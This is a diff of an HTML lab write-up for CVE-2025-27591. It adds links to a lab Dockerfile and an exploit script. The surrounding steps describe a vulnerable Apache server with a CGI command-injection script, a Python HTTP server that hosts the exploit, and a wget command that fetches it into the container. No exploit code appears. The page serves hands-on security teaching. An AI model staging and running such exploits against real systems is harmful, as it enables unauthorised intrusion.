@@ -221,7 +221,7 @@
 <hr>
 <h2 id="lab-setup">Lab Setup</h2>
 <h3 id="1-download-the-dockerfile">1. Download the Dockerfile</h3>
-<p>Download the lab Dockerfile (included at the bottom of this document). This Dockerfile builds a container with:</p>
+<p>Download the lab <a href="https://raw.githubusercontent.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/refs/heads/main/CVE_2025_27591/Dockerfile">Dockerfile</a> (included at the bottom of this document). This Dockerfile builds a container with:</p>
 <ul>
 <li>A vulnerable Apache server</li>
 <li>A CGI script with command injection</li>
@@ -304,7 +304,7 @@
 <h3 id="step-5-transfer-the-exploit">Step 5: Transfer the Exploit</h3>
 <p>Start a Python HTTP server to host the exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><p>Download the exploit inside the container:</p>
+</span></span></code></pre></div><p><a href="https://raw.githubusercontent.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/refs/heads/main/CVE_2025_27591/CVE_2025_27591.py">Download the exploit</a> inside the container:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://localhost:4444/CVE_2025_27591.py
 </span></span></code></pre></div>
     <img src="/CVE_2025_27591/wget.png"  alt="Fetching exploit"  class="center"  style="border-radius: 8px; width: 100%;"  />
